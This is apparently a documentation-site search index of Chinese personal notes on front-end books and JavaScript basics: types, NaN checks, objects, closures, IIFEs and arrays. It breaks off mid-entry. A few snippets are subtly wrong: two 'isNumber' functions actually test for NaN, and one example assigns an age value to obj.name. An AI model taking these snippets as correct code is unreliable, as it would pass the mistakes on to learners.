{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\u8fd9\u662f\u524d\u7aef\u4e66\u7c4d\u548c\u7535\u5b50\u6559\u7a0b\u7b14\u8bb0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 2333  \u9605\u8bfb5\u5206\u949f</p>"},{"location":"#_2","title":"\u4e66\u7c4d","text":"<p>\u6df1\u5165\u6d45\u51faReact\u548cRedux \u7b14\u8bb0 + \u6e90\u4ee3\u7801</p> <p>JS\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5</p> <p>\u554a\u54c8\u7b97\u6cd5</p> <p>JS\u8bed\u8a00\u7cbe\u7cb9-\u8774\u8776\u4e66</p> <p>JS\u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1 \u6b63\u5728\u9605\u8bfb</p> <p>book-CSSzengarden \u300aCSS\u7985\u610f\u82b1\u56ed\u300b\u6ca1\u770b\u5b8c\uff0c\u9002\u5408\u5165\u95e8\u7684CSS\u7248\u9762\u8bbe\u8ba1\u98ce\u683c</p> <p>book-cleaner-code \u300a\u4ee3\u7801\u6574\u6d01\u4e4b\u9053\u300b\u57fa\u4e8e Java \u8bed\u8a00\uff0c\u5176\u4e2d\u5f88\u591a\u7b56\u7565\u503c\u5f97\u501f\u9274</p>"},{"location":"#_3","title":"\u7535\u5b50\u4e66","text":"<p>JS\u8bed\u8a00\u57fa\u7840 ebook-JS-basic \u962e\u4e00\u5cf0\uff0c\u4ecb\u7ecd\u4e86ES5\u57fa\u672c\u8bed\u6cd5\uff0cDOM\uff0cBOM </p> <p>JS\u8bed\u8a00ES6 ebook-JSES6-RYF \u962e\u4e00\u5cf0\uff0c\u5b66\u4e60ES6\u7684\u5fc5\u4e0d\u53ef\u5c11\u7684\u4e66\u7c4d </p> <p>JS\u79d8\u5bc6\u82b1\u56ed ebook-javascript-secret-garden \u8fd9\u672c\u4e66\u5199\u4e86\u4e00\u4e9b\u7ec6\u8282</p> <p>JS\u5168\u6808\u5de5\u7a0b\u5e08\u6559\u7a0b ebook-jstraining-RYF \u962e\u4e00\u5cf0\uff0c\u7b80\u4ecb\u524d\u7aef\u5de5\u7a0b\u5316 </p>"},{"location":"#_4","title":"\u5728\u7ebf\u6559\u7a0b","text":"<p>\u5177\u4f53\u7c7b\u522b\u9700\u8981\u6574\u7406\uff0c\u6bcf\u4e00\u4e2a\u8bfe\u7a0b\u9700\u8981\u603b\u7ed3\u91cd\u70b9\uff0c\u601d\u7ef4\u5bfc\u56fe\u7b49</p> <p>\u7f51\u6613\u4e91\u8bfe\u5802\u524d\u7aef</p> <p>\u7f51\u6613\u4e91\u8bfe\u5802\u540e\u7aef</p> <p>\u963f\u91cc\u4e91\u8bfe\u5802\u540e\u7aef</p> <p>\u9ed1\u9a6c\u7a0b\u5e8f\u5458</p> <p>\u5f00\u8bfe\u5427</p> <p>\u5c1a\u7845\u8c37</p> <p>bilibili \u5728\u7ebf\u8bfe\u7a0b\uff08\u54c8\u5de5\u5927\u3001\u5357\u5927\u3001\u6d59\u5927\u7b49\uff09</p>"},{"location":"ebook-JS-basic/01-%E5%85%A5%E9%97%A8/","title":"Javascript \u57fa\u7840\u6559\u7a0b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 497  \u9605\u8bfb1\u5206\u949f</p> <p>2021-11-16 2023-04-02</p> <p>\u539f\u4f5c\u8005\u962e\u4e00\u5cf0\u63a8\u8350\u7684\u5165\u95e8\u6559\u7a0b\uff0c\u91cd\u5728\u67e5\u6f0f\u8865\u7f3a https://wangdoc.com/javascript/index.html</p>"},{"location":"ebook-JS-basic/01-%E5%85%A5%E9%97%A8/#_1","title":"\u7b2c\u4e00\u7ae0 \u5165\u95e8","text":"<p>JS \u662f\u4e00\u4e2a\u811a\u672c\u8bed\u8a00\uff0c\u5fc5\u987b\u4f9d\u6258\u4e8e\u8fd0\u884c\u73af\u5883(\u6d4f\u89c8\u5668\u73af\u5883\uff0c\u6216\u8005node\u73af\u5883) </p> <p>JS \u81ea\u5df1\u53ef\u4ee5\u5b9e\u73b0\u7b80\u5355\u7684\u8bed\u6cd5\u548c\u81ea\u8eab\u7684\u5bf9\u8c61\uff0c\u66f4\u91cd\u8981\u7684\u8c03\u7528\u5bbf\u4e3b\u7684API (DOM \u6587\u6863\u5bf9\u8c61\u3001BOM\u6d4f \u89c8\u5668\u5bf9\u8c61\u3001Ajax\u7f51\u7edc\u8bf7\u6c42)\u3002</p> <p>\u8fd9\u91cc\u4ee5 ES5 \u4e3a\u6807\u51c6\uff0c\u53ea\u8ba8\u8bba\u6d4f\u89c8\u5668\uff0c\u4e0d\u6d89\u53ca Node \u73af\u5883 API\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","title":"02-\u6570\u636e\u7c7b\u578b","text":""},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_1","title":"\u7b2c\u4e8c\u7ae0 \u6570\u636e\u7c7b\u578b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8043  \u9605\u8bfb17\u5206\u949f</p> <p>2021-11-16 2023-04-03</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#21","title":"2.1 \u57fa\u672c\u7c7b\u578b","text":"<pre><code>typeof null === 'object'\nundefined == null\n</code></pre>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#22","title":"2.2 \u6570\u503c","text":""},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#isnan","title":"isNaN","text":"<p>isNan \u53ef\u4ee5\u5224\u65ad\u662f\u5426\u662f NaN\uff0c\u4f46\u662f\u5b9e\u9645\u53ef\u80fd\u51fa\u73b0\u95ee\u9898\uff1a\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u4e0d\u662f\u6570\u503c\uff0c\u9700\u8981\u9996\u5148\u8f6c\u5316\u6210\u6570\u503c\uff0c\u4e4b\u540e\u8fdb\u884c\u5224\u65adNaN\uff0c\u8fd9\u6837\u53ef\u80fd\u9020\u6210\u4e0d\u51c6\u786e\u3002</p> <pre><code>isNaN(NaN) =&gt; true\nisNaN('test') == isNaN(Number('test')) =&gt; true\nisNaN('') =&gt; false\nisNaN([]) =&gt; false\nisNaN([1,2]) =&gt; true\n</code></pre> <p>\u6240\u4ee5\u5b9e\u9645\u5224\u65ad\u65f6\uff0c\u9996\u5148\u9700\u8981\u5224\u65ad\u662f\u5426\u662f\u6570\u503c</p> <pre><code>function isNumber(para) {\n  return typeof(para) === 'number' &amp;&amp; isNaN(para);\n}\n</code></pre> <p>\u66f4\u597d\u7684\u529e\u6cd5\uff1a\u5229\u7528NaN\u4e0d\u7b49\u4e8e\u81ea\u5df1\u8fdb\u884c\u5224\u65ad</p> <pre><code>function isNumber(para) {\n  return para !== para;\n}\n</code></pre>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#isfinite","title":"isFinite","text":"<p>isFinite() \u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u662f\u6b63\u5e38\u7684\u6570\u503c\u3002</p> <p>\u5982\u679c\u4f20\u5165\u7684\u662fundefined NaN Infinity -Infinity \u5c31\u8fd4\u56defalse</p> <p>\u4f20\u5165\u6570\u503c\u6216\u8005null\u8fd4\u56de\u7684\u662ftrue</p> <p>\u5f53\u7136\uff0c\u5982\u679c\u4f20\u5165\u7684\u4e0d\u662f\u6570\u503c\uff0c\u9996\u5148\u8f6c\u5316\u6210\u6570\u503c\u518d\u5224\u65ad\u3002\u4f8b\u5982\u5b57\u7b26\u4e32123\u548c\u5b57\u7b26\u4e32test\u5206\u522b\u5bf9\u5e94\u771f\u5047\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#23","title":"2.3 \u5b57\u7b26\u4e32","text":""},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_2","title":"\u5b57\u7b26\u4e32\u5f15\u53f7","text":"<p>\u5b57\u7b26\u4e32\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7\u5305\u88f9\uff0c\u5982\u679c\u4e00\u4e2a\u5b57\u7b26\u4e32\u5185\u90e8\u6709\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\uff0c\u9700\u8981\u4f7f\u7528\u53cd\u659c\u6760\u8fdb\u884c\u8f6c\u4e49\uff08URL\uff0csql \u8bed\u53e5\u4e2d\u5c24\u5176\u9700\u8981\u8f6c\u4e49\uff09\u3002</p> <p>\u7531\u4e8eHTML\u4f7f\u7528\u53cc\u5f15\u53f7\uff0cJS\u6700\u597d\u4f7f\u7528\u5355\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff0c\u907f\u514d\u6df7\u6dc6\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_3","title":"\u5b57\u7b26\u4e32\u548c\u6570\u7ec4","text":"<p>\u5b57\u7b26\u4e32\u53ef\u4ee5\u89c6\u4e3a\u5b57\u7b26\u6570\u7ec4</p> <p>\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4e0b\u6807\u83b7\u53d6\u5177\u4f53\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u4f46\u662f\u65e0\u6cd5\u6539\u53d8\u5b57\u7b26\u4e32\uff08\u53ea\u8bfb\u5c5e\u6027\uff09\u3002\u5982\u679c\u4f20\u5165\u7684\u4e0b\u6807\u5927\u4e8e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6216\u8005\u4e0b\u6807\u4e0d\u662f\u6570\u5b57\uff0c\u90a3\u4e48\u8fd4\u56de\u7684\u5c31\u662f undefined\u3002\u5b57\u7b26\u4e32\u53ef\u4ee5\u83b7\u53d6\u957f\u5ea6 string.length \u4e5f\u662f\u53ea\u8bfb\u5c5e\u6027\u3002</p> <p>\u5b57\u7b26\u4e32\u4e0d\u5177\u6709\u6570\u7ec4\u7684\u5176\u4ed6\u5c5e\u6027\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_4","title":"\u5b57\u7b26\u4e32\u7f16\u7801","text":"<p>\u5b57\u7b26\u4e32\u6709\u591a\u4e2a\u7f16\u7801\u5f62\u5f0f\uff0c\u4e0d\u540c\u7f16\u7801\u7684\u8f6c\u6362\uff08\u901a\u5e38\u662f utf-8\uff0c\u67d0\u4e9b\u8868\u60c5 utf8md4 \u7b49\u9700\u8981\u7279\u6b8a\u5904\u7406\uff09</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#24","title":"2.4 \u5bf9\u8c61","text":"<p>\u5bf9\u8c61\u7531\u952e\u503c\u5bf9\u7ec4\u6210\u3002</p> <p>\u5bf9\u8c61\u7684\u952e\u9ed8\u8ba4\u662f\u5b57\u7b26\u4e32\u3002\u5982\u679c\u662f\u6570\u503c\uff0c\u4f1a\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u3002\u5728ES6\u4e2d\uff0csymbol \u4e5f\u53ef\u4ee5\u505a\u952e\u3002</p> <p>\u5bf9\u8c61\u7684\u503c\u6570\u636e\u7c7b\u578b\u6bd4\u8f83\u591a\uff1a\u53ef\u4ee5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u4e2a\u952e\u5c31\u662f\u5bf9\u8c61\u7684\u65b9\u6cd5\uff1b\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u5c31\u662f\u5bf9\u8c61\u7684\u94fe\u5f0f\u5f15\u7528\uff08\u6ce8\u610f\u5bf9\u8c61\u7684\u6df1\u590d\u5236\u548c\u6d45\u590d\u5236\uff09\u3002</p> <pre><code>let obj = {\n  b: function(para) {\n    return para * 2;\n  }\n};\n</code></pre>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_5","title":"\u5bf9\u8c61\u7684\u5c5e\u6027","text":"<p>\u5bf9\u8c61\u7684\u5c5e\u6027\u53ef\u4ee5\u52a8\u6001\u521b\u5efa\uff1b</p> <p>\u5982\u679c\u4e0d\u540c\u7684\u53d8\u91cf\u6307\u5411\u76f8\u540c\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u4e9b\u53d8\u91cf\u90fd\u662f\u8fd9\u4e9b\u5bf9\u8c61\u7684\u5f15\u7528\uff08\u6307\u9488\uff09\u3002\u5982\u679c\u6539\u53d8\u4e00\u4e2a\u5f15\u7528\u6570\u503c\uff0c\u5176\u4ed6\u5f15\u7528\u4e5f\u4f1a\u6539\u53d8\u3002\u83b7\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\uff0c\u5982\u679c\u5c5e\u6027\u662f\u6570\u5b57\uff0c\u4e0d\u80fd\u4f7f\u7528\u70b9\u8bed\u6cd5\u83b7\u53d6(\u4f1a\u5f53\u505a\u5c0f\u6570\u70b9\u62a5\u9519)\uff0c\u53ef\u4ee5\u901a\u8fc7\u65b9\u62ec\u53f7\u83b7\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <p>\u67e5\u770b\u5bf9\u8c61\u7684\u5c5e\u6027\uff1a\u4f7f\u7528 Object.keys(obj) \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002\u901a\u5e38\u4f7f\u7528 for in \u904d\u5386\u5bf9\u8c61\u4e2d\u7684\u5c5e\u6027\uff0c\u8fd9\u6837\u53ef\u4ee5\u83b7\u53d6\u8bbe\u7f6e\u4e0d\u540c\u7684\u5c5e\u6027\u3002</p> <pre><code>console.log(Object.keys(document)); // \u00a0['location', 'search']\n</code></pre> <pre><code>var obj = { name: \"Mike\", age: 18 };\n\n// \u907f\u514d\u4f7f\u7528 with \u8bed\u53e5\u83b7\u53d6\u5bf9\u8c61\u5185\u90e8\u7684\u5c5e\u6027\nwith (obj) {\n  name = \"Harry\";\n  age = 15;\n}\n\n// equal with \nobj.name = \"Harry\";\nobj.name = 15;\n</code></pre> <p>\u597d\u5904\uff1a\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u6216\u8005\u6539\u53d8\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027</p> <p>\u6ce8\u610f\uff1a\u5982\u679c\u5bf9\u8c61\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0cwith \u5927\u62ec\u53f7\u5185\u8d4b\u503c\u4f1a\u5f62\u6210\u5f53\u524d\u4f5c\u7528\u57df\u5185\u90e8\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5bf9\u8c61\u5e76\u4e0d\u4f1a\u65b0\u589e\u5c5e\u6027\uff0c\u6240\u4ee5\u4e0d\u8981\u4f7f\u7528 with \u6539\u53d8\u5bf9\u8c61\u7684\u53d8\u91cf\u3002</p> <pre><code>var obj = {};\nwith (obj) {\n  name = \"Mike\";\n}\nconsole.log(obj.name); // undefined\nconsole.log(name); // \"Mike\"\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4e34\u65f6\u53d8\u91cf\u4ee3\u66ff with.</p> <pre><code>let _obj = obj.obj1.obj2;\n_obj.name = \"Mike\";\n</code></pre>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#25","title":"2.5 \u51fd\u6570","text":""},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_6","title":"\u51fd\u6570\u7684\u58f0\u660e","text":"<p>\u51fd\u6570\u7684\u91cd\u590d\u58f0\u660e\uff1a\u51fd\u6570\u540d\u7684\u63d0\u5347\u4f1a\u9020\u6210\u540e\u9762\u7684\u51fd\u6570\u6c38\u8fdc\u8986\u76d6\u524d\u9762\u7684\u51fd\u6570\u3002\u5982\u679c\u540c\u65f6\u4f7f\u7528function\u547d\u4ee4\u548c\u53d8\u91cf\u8d4b\u503c\u58f0\u660e\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u53d8\u91cf\u63d0\u5347\u540e\uff0c\u4f1a\u4fdd\u7559\u8d4b\u503c\u58f0\u660e\u7684\u51fd\u6570\u3002</p> <pre><code>var f = function() {\n  console.log('test');\n}\nfunction f() {\n  console.log('test-bug');\n}\nf(); // test\n</code></pre> <p>\u6027\u80fd\uff1a\u76f4\u63a5\u8fd0\u7b97 &gt; for\u5faa\u73af &gt; \u51fd\u6570\u9012\u5f52 recursion</p> <p>\u51fd\u6570\u9012\u5f52\u8c03\u7528\u53ef\u80fd\u5b58\u5728\u8fb9\u754c\u9519\u8bef\uff0c\u9020\u6210\u5185\u5b58\u6cc4\u6f0f</p> <p>\u51fd\u6570\u5982\u679c\u6ca1\u6709\u8fd4\u56de\u8bed\u53e5 return\uff0c\u90a3\u4e48\u8fd4\u56de\u503c\u662fundefined</p> <p>\u51fd\u6570\u662f\u4e00\u7b49\u516c\u6c11\uff1a\u51fd\u6570\u548c\u5176\u4ed6\u53d8\u91cf\u4e00\u6837\uff1a\u53ef\u4ee5\u628a\u51fd\u6570\u5f53\u505a\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u503c\uff0c\u90a3\u4e48\u51fd\u6570\u7c7b\u4f3c\u4e8e\u53d8\u91cf\u53ef\u4ee5\u4f20\u5165\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u6216\u8005\u4f5c\u4e3a\u51fd\u6570\u7684\u7ed3\u679c\u8fd4\u56de\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_7","title":"\u51fd\u6570\u7684\u5c5e\u6027\u548c\u65b9\u6cd5","text":"<p>\u51fd\u6570\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u7ee7\u627f\u4e86\u5bf9\u8c61\u7684\u5c5e\u6027</p> <p>Function.name \u53ef\u4ee5\u83b7\u53d6\u51fd\u6570\u7684\u540d\u5b57(\u4e0d\u4f1a\u8fd9\u6837\u505a)</p> <p>Function.length \u83b7\u53d6\u51fd\u6570\u9ed8\u8ba4\u4f20\u5165\u53c2\u6570\u7684\u4e2a\u6570(\u53ef\u4ee5\u5224\u65ad\u51fd\u6570\u5b9a\u4e49\u65f6\u548c\u8c03\u7528\u65f6\u7684\u53c2\u6570\u7684\u5dee\u5f02)</p> <p>Function.toString \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c31\u662f\u51fd\u6570\u7684\u6e90\u7801</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_8","title":"\u51fd\u6570\u4f5c\u7528\u57df","text":"<p>\u5728ES5\u4e2d\uff0c\u53ea\u6709\u51fd\u6570\u4f5c\u7528\u57df\u548c\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u5728ES6\u4e2d\u589e\u52a0\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\uff1b</p> <p>\u51fd\u6570\u5185\u90e8\u53d8\u91cf\u4f1a\u63d0\u5347\u5230\u51fd\u6570\u5934\u90e8\u3002</p> <p>\u51fd\u6570\u5982\u679c\u5f15\u7528\u5916\u90e8\u7684\u53c2\u6570\uff0c\u90a3\u4e48\u9700\u8981\u6839\u636e\u51fd\u6570\u5b9a\u4e49\u65f6\u7684\u73af\u5883\u5224\u65ad\u5916\u90e8\u7684\u53d8\u91cf\u3002\u8fd9\u6837\uff0c\u5982\u679c\u5728\u51fd\u6570\u5d4c\u5957\u4e2d\u51fa\u73b0\uff0c\u5728\u4e00\u4e2a\u51fd\u6570\u5916\u90e8\u53ef\u4ee5\u8bbf\u95ee\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u6784\u6210\u4e86\u95ed\u5305\u7ed3\u6784\u3002</p> <pre><code>function foo() {\n  var str = 'test';\n  function bar() {\n    console.log(str);\n  }\n  return bar;\n}\nvar f = foo();\nf();\n// \u53ef\u4ee5\u83b7\u53d6\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\n</code></pre> <p>\u95ed\u5305\u53ef\u4ee5\u8ba9\u53d8\u91cf\u59cb\u7ec8\u5728\u5185\u5b58\u4e2d\uff0c\u53ef\u4ee5\u4fdd\u5b58\u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u53c2\u6570\u7b49\uff0c\u95ed\u5305\u662f\u5185\u90e8\u51fd\u6570\u4f5c\u7528\u57df\u7684\u4e00\u4e2a\u5bf9\u5916\u63a5\u53e3\u3002\u53ef\u4ee5\u5c01\u88c5\u5bf9\u8c61\u7684\u79c1\u6709\u65b9\u6cd5\u3002\u5916\u5c42\u51fd\u6570\u8fd0\u884c\u65f6\uff0c\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u95ed\u5305\uff0c\u8fd9\u4e2a\u95ed\u5305\u4f1a\u6301\u7eed\u4fdd\u5b58\u5916\u90e8\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff0c\u6240\u4ee5\u5185\u5b58\u6d88\u8017\u8f83\u5927\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_9","title":"\u51fd\u6570\u7acb\u5373\u6267\u884c","text":"<p>IIFE (Immediately Invoked Function Expression) </p> <pre><code>(\n  function(){\n    /* codes */\n  }()\n);\n// \u51fd\u6570\u5b9a\u4e49\u540e\u7acb\u5373\u6267\u884c\n</code></pre> <p>\u597d\u5904\uff1a\u51cf\u5c11\u5168\u5c40\u53d8\u91cf(\u5bf9\u4e8e\u53ea\u8fd0\u884c\u4e00\u6b21\u7684\u51fd\u6570)\uff0c\u51fd\u6570\u540d\u5c31\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff1b\u540c\u65f6\u53ef\u4ee5\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u53ef\u4ee5\u5c01\u88c5\u5916\u90e8\u51fd\u6570\u65e0\u6cd5\u8bfb\u53d6\u7684\u79c1\u6709\u53d8\u91cf\u3002\u9002\u5408\u4e8e\u53ea\u8fd0\u884c\u4e00\u6b21\u7684\u51fd\u6570\u3002</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#26","title":"2.6 \u6570\u7ec4","text":"<p>\u6e05\u7a7a\u6570\u7ec4\u7684\u4e00\u4e2a\u65b9\u6cd5\uff1aarray.length = 0; </p> <p>\u6570\u7ec4\u7684\u672c\u8d28\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5982\u679c\u4eba\u4e3a\u6dfb\u52a0\u6570\u7ec4\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u4e0d\u4f1a\u5f71\u54cd\u5230\u6570\u7ec4\u7684\u957f\u5ea6\uff08\u5f53\u7136\uff0c\u4e0d\u5efa\u8bae\u76f4\u63a5\u6539\u53d8\u6570\u7ec4\u7684\u5c5e\u6027\uff0c\u83b7\u53d6\u5c5e\u6027\u548c\u6570\u7ec4\u7684\u9879\u5c31\u4f1a\u4e0d\u65b9\u4fbf\uff09\u3002\u5982\u679c\u8bbe\u7f6e\u6570\u7ec4\u7684\u4e0b\u6807\u4e0d\u5408\u6cd5(\u8d1f\u6570\u6216\u8005\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6570\u7ec4\u7684\u67d0\u4e2a\u4e0b\u6807)\u90a3\u4e48\u8fd9\u4e2a\u4e0b\u6807\u5c31\u4f1a\u8f6c\u5316\u6210\u6570\u7ec4\u7684\u5c5e\u6027\u3002</p> <p>\u5982\u679c\u5728 leetcode \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u5177\u6709\u5bf9\u8c61\u7684\u7279\u70b9\uff0c\u76f4\u63a5\u5b58\u50a8\u503c\uff0c\u4f7f\u6570\u7ec4\u5177\u6709\u5bf9\u8c61\u7684\u7d22\u5f15\u5173\u7cfb\uff0c\u540c\u65f6\u5177\u6709\u7ebf\u6027\u5b58\u50a8\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u8282\u7701\u5185\u5b58\u3002\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u4e3a\u4e86\u4ee3\u7801\u53ef\u8bfb\u6027\u548c\u53ef\u7ef4\u62a4\u6027\uff0c\u6700\u597d\u907f\u514d\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u7684\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <pre><code>let arr = [];\narr[-1] = '0';\narr['name'] = \"Mike\";\nconsole.log(arr.length); //0\nconsole.log(arr[-1]); // '0' \u56e0\u4e3a-1\u9996\u5148\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u83b7\u53d6\u7684\u6570\u7ec4\u7684\u5c5e\u6027\n</code></pre> <p>\u4f7f\u7528 for\u2026in \u53ef\u4ee5\u904d\u5386\u6570\u7ec4\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6570\u5b57\u4e0b\u6807\u548c\u6570\u7ec4\u7684\u5c5e\u6027</p> <p>\u4f7f\u7528 delete \u4f1a\u5220\u9664\u6570\u7ec4\u7684\u67d0\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\uff0c\u5f62\u6210\u4e00\u4e2a\u7a7a\u4f4d\uff0c\u8fd4\u56de undefined\uff0c\u4f46\u662f\u6570\u7ec4\u7684\u957f\u5ea6\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\uff08\u6240\u4ee5\u907f\u514d\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u76f4\u63a5\u4f7f\u7528 pop shift splice \u5373\u53ef\uff09</p> <pre><code>let arr = [1, 2, 3];\ndelete arr[2];\nconsole.log(arr); // [1, 2, empty];\nconsole.log(arr[2]); // undefined\n</code></pre> <p>\u5982\u679c\u6570\u7ec4\u7528 delete \u5220\u9664\u4e86\u4e00\u4e2a\u5143\u7d20\u9020\u6210\u7a7a\u4f4d\uff0c\u7136\u540e\u4f7f\u7528 for \u548c length \u4f1a\u904d\u5386\u5230\u8fd9\u4e2a undefined \u503c\uff0c\u53ef\u80fd\u9020\u6210\u9519\u8bef\uff1b\u4f7f\u7528 for\u2026in\u2026 \u6216\u8005 forEach \u904d\u5386\u65f6\uff0c\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u8f93\u51fa\u7ed3\u679c\u3002\u6240\u4ee5\uff0c\u5c3d\u91cf\u907f\u514d\u4f7f\u7528 delete \u65b9\u6cd5\uff0c\u4f18\u5148\u4f7f\u7528 forEach \u904d\u5386\u6570\u7ec4\u7684\u503c\u3002</p> <p>\u6240\u4ee5\u5982\u679c\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbe\u7f6e\u957f\u5ea6\uff0c<code>arr.length = arr.length - 1</code>\uff08\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u8bfb\u6027\u6bd4\u8f83\u5dee\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>arr.pop()</code> \u65b9\u6cd5\uff0c\u8868\u793a\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff09</p>"},{"location":"ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#_10","title":"\u4f2a\u6570\u7ec4","text":"<p>\u6700\u5e38\u89c1\u7684\u4f2a\u6570\u7ec4\u5c31\u662f\u51fd\u6570\u7684 arguments \u5c5e\u6027</p> <p>\u4f2a\u6570\u7ec4\u8f6c\u6362\u6210\u6570\u7ec4\uff08ES5\uff09</p> <pre><code>var arr = Array.prototype.slice.call(arrayLike);\n</code></pre> <p>ES6</p> <pre><code>let arr = [...arrayLike];\n</code></pre>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/","title":"03-\u8fd0\u7b97\u7b26","text":""},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_1","title":"\u7b2c\u4e09\u7ae0 \u8fd0\u7b97\u7b26","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 2034  \u9605\u8bfb5\u5206\u949f</p> <p>2021-11-16 2023-04-03</p>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#31","title":"3.1 